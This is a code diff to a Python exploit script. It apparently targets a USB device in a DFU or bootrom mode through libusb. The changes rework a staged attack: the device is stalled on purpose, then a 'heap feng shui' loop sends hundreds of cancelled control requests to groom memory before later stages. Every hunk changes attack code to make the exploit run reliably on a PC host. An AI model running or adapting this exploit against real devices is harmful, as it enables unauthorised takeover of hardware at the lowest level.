@@ -180,8 +180,6 @@ class LibUSB:
         L.libusb_attach_kernel_driver.restype = c_int
         L.libusb_reset_device.argtypes = [c_void_p]
         L.libusb_reset_device.restype = c_int
-        L.libusb_clear_halt.argtypes = [c_void_p, c_uint8]
-        L.libusb_clear_halt.restype = c_int
         L.libusb_control_transfer.argtypes = [c_void_p, c_uint8, c_uint8, c_uint16,
                                                c_uint16, c_void_p, c_uint16, c_uint32]
         L.libusb_control_transfer.restype = c_int
@@ -264,12 +262,6 @@ class LibUSB:
     def reset(self, handle):
         try:
             return self.lib.libusb_reset_device(handle)
-        except Exception:
-            return -1
-
-    def clear_halt(self, handle, endpoint):
-        try:
-            return self.lib.libusb_clear_halt(handle, endpoint)
         except Exception:
             return -1
 
@@ -436,20 +428,21 @@ def auto_out_spin(spin_us, data_len):
     return max(spin_us, 150 + packets * 200)
 
 
-def heap_feng_shui_req(usb, handle, serial_idx, sz, debug=False):
-    """One heap feng shui request.
+def heap_feng_shui_req(usb, handle, serial_idx, sz, spin_us, debug=False):
+    """One heap feng shui request: SETUP only, cancelled before any status phase.
 
-    The Arduino abandons the status phase, but on a PC host the reliable
-    equivalent is a complete control-IN transfer: at this point
-    ep0_data_phase_buffer is NULL, so the status ZLP is ignored by the A5
-    zero-length-packet quirk.  What matters is that the SETUP is processed.
+    After the intentional stall request, complete control-IN transfers wedge on
+    this PC host.  The Arduino only counts the SETUP ACK here; the data phase is
+    not important for the heap grooming.  A raw cancelled URB sends the SETUP and
+    is accepted by usbfs even when the control endpoint is halted.
     """
-    rc, _ = usb.ctrl_in(handle, 0x80, REQ_GET_DESCRIPTOR,
-                        (STRING_DESCRIPTOR << 8) | serial_idx, LEAK_LANG,
-                        sz, 10)
+    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                            sz, b'', abandon=True, spin_us=spin_us,
+                            timeout_ms=500, name='feng shui %#x' % sz)
     if debug:
-        print('    [debug] feng shui %#x rc=%d' % (sz, rc))
-    return rc > 0
+        debug_raw('feng shui %#x' % sz, rc, info)
+    return rc == 0
 
 
 def stage0(usb):
@@ -460,14 +453,10 @@ def stage0(usb):
         reset_and_release(usb, handle, settle=0.5)
 
 
-def stage1(usb, serial_idx, leak_count, debug):
+def stage1(usb, serial_idx, leak_count, spin_us, debug):
     print('== stage 1: heap feng shui (%d leak requests) ==' % leak_count)
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
-    # The STALL response halts this control transfer's endpoint 0 on the PC
-    # host; clear only the control endpoint.  Do not clear 0x80 — the Arduino
-    # sequence intentionally leaves the DFU endpoint stalled.
-    usb.clear_halt(handle, 0)
     success = 0
     attempts = 0
     max_attempts = leak_count + 200
@@ -477,14 +466,11 @@ def stage1(usb, serial_idx, leak_count, debug):
             usb.release(handle)
             raise SystemExit('error: only %d/%d leak requests were accepted' % (success, leak_count))
         req_debug = debug and (attempts <= 3 or attempts % 100 == 0)
-        if heap_feng_shui_req(usb, handle, serial_idx, 0x80, req_debug):
+        if heap_feng_shui_req(usb, handle, serial_idx, 0x80, spin_us, req_debug):
             success += 1
         if attempts % 100 == 0:
             print('  %d/%d' % (success, leak_count))
-    if debug:
-        heap_feng_shui_req(usb, handle, serial_idx, 0x81, True)  # no leak
-    else:
-        heap_feng_shui_req(usb, handle, serial_idx, 0x81, False)
+    heap_feng_shui_req(usb, handle, serial_idx, 0x81, spin_us, debug)  # no leak
     print('  feng shui done (%d attempts)' % attempts)
     reset_and_release(usb, handle, settle=0.5)
 
@@ -630,7 +616,7 @@ def exploit(args):
     if args.stage in ('all', '0'):
         stage0(usb)
     if args.stage in ('all', '1'):
-        stage1(usb, serial_idx, args.leak, args.debug)
+        stage1(usb, serial_idx, args.leak, args.spin_us, args.debug)
     if args.stage in ('all', '2'):
         stage2(usb, args.spin_us, args.out_spin_us, args.debug)
     if args.stage in ('all', '3'):
